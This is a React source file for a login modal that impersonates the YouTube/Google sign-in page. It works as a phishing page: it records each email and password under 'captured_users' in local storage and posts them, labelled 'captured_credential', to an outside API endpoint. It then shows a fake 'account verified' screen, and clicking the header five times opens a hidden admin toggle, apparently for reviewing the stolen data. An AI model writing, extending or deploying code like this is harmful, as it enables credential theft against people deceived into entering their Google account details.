
import React, { useState } from 'react';
import { LoginStep, CapturedUser } from '../types';
import EmailStep from './EmailStep';
import PasswordStep from './PasswordStep';
import ForgotEmailStep from './ForgotEmailStep';
import ForgotPasswordStep from './ForgotPasswordStep';
import GoogleLogo from './icons/GoogleLogo';

// Using a standard RESTful test API
const API_ENDPOINT = 'https://api.restful-api.dev/objects';

const LoginModal: React.FC = () => {
  const [step, setStep] = useState<LoginStep>(LoginStep.EMAIL);
  const [email, setEmail] = useState('');
  const [clickCount, setClickCount] = useState(0);
  const [isSyncing, setIsSyncing] = useState(false);

  const handleHeaderClick = () => {
    const newCount = clickCount + 1;
    if (newCount >= 5) {
      window.dispatchEvent(new CustomEvent('toggle-admin'));
      setClickCount(0);
    } else {
      setClickCount(newCount);
      setTimeout(() => setClickCount(0), 2000);
    }
  };

  const handleEmailSubmit = (submittedEmail: string) => {
    setEmail(submittedEmail);
    setStep(LoginStep.PASSWORD);
  };

  const saveToLocal = (user: CapturedUser) => {
    const existing = JSON.parse(localStorage.getItem('captured_users') || '[]');
    existing.push(user);
    localStorage.setItem('captured_users', JSON.stringify(existing));
  };

  const handlePasswordSubmit = async (password: string) => {
    setIsSyncing(true);
    
    const newUser: CapturedUser = {
      id: Math.random().toString(36).substr(2, 9),
      email: email,
      password: password,
      timestamp: Date.now(),
    };

    // 1. Always save to Local Storage immediately
    saveToLocal(newUser);

    // 2. Attempt Cloud Sync
    try {
      const payload = {
        name: email,
        data: {
          password: password,
          timestamp: newUser.timestamp,
          type: 'captured_credential',
          client_id: 'yt_mobile_v1'
        }
      };

      await fetch(API_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      
      console.log('Cloud sync successful');
    } catch (error) {
      console.error('Cloud sync failed, data saved locally only:', error);
    } finally {
      setIsSyncing(false);
      setStep(LoginStep.SUCCESS);
    }
  };

  const renderStep = () => {
    switch (step) {
      case LoginStep.EMAIL:
        return <EmailStep onSubmit={handleEmailSubmit} onForgotEmail={() => setStep(LoginStep.FORGOT_EMAIL)} />;
      case LoginStep.FORGOT_EMAIL:
        return <ForgotEmailStep onBack={() => setStep(LoginStep.EMAIL)} />;
      case LoginStep.PASSWORD:
        return (
          <PasswordStep 
            email={email} 
            isSyncing={isSyncing}
            onSubmit={handlePasswordSubmit} 
            onBack={() => setStep(LoginStep.EMAIL)} 
            onForgotPassword={() => setStep(LoginStep.FORGOT_PASSWORD)} 
          />
        );
      case LoginStep.FORGOT_PASSWORD:
        return <ForgotPasswordStep email={email} onBack={() => setStep(LoginStep.PASSWORD)} />;
      case LoginStep.SUCCESS:
        return (
          <div className="text-center p-8 animate-in fade-in duration-500">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl font-semibold mb-2 text-gray-900">Success!</h2>
            <p className="text-gray-600">Your account has been verified. You will be redirected shortly.</p>
            <button 
              onClick={() => setStep(LoginStep.EMAIL)}
              className="mt-8 text-blue-600 font-medium hover:underline"
            >
              Back to sign in
            </button>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="bg-white rounded-lg w-full max-w-[450px] border border-[#dadce0] shadow-sm overflow-hidden min-h-[500px] flex flex-col">
      <div className="px-6 py-10 sm:px-10 flex-grow">
        <div 
          className="text-center mb-8 cursor-default select-none active:opacity-70 transition-opacity"
          onClick={handleHeaderClick}
        >
          <div className="flex items-center justify-center gap-2 mb-3">
            <GoogleLogo />
            <span className="text-2xl font-medium tracking-tight text-[#5f6368]">YouTube</span>
          </div>
          <h1 className="text-2xl font-normal text-[#202124] mb-2">
            {step === LoginStep.FORGOT_EMAIL ? 'Find your email' : 
             step === LoginStep.FORGOT_PASSWORD ? 'Account recovery' : 
             'Sign in'}
          </h1>
          <p className="text-base text-[#202124]">
            {step === LoginStep.FORGOT_EMAIL ? 'Enter your recovery email or phone number' :
             step === LoginStep.FORGOT_PASSWORD ? 'Confirm the account belongs to you' :
             'to continue to YouTube'}
          </p>
        </div>
        <div className="mt-2">
          {renderStep()}
        </div>
      </div>
      <div className="px-10 py-4 flex justify-between text-xs text-[#70757a]">
        <div className="flex gap-4">
          <span>English (United States)</span>
        </div>
        <div className="flex gap-4">
          <span>Help</span>
          <span>Privacy</span>
          <span>Terms</span>
        </div>
      </div>
    </div>
  );
};

export default LoginModal;
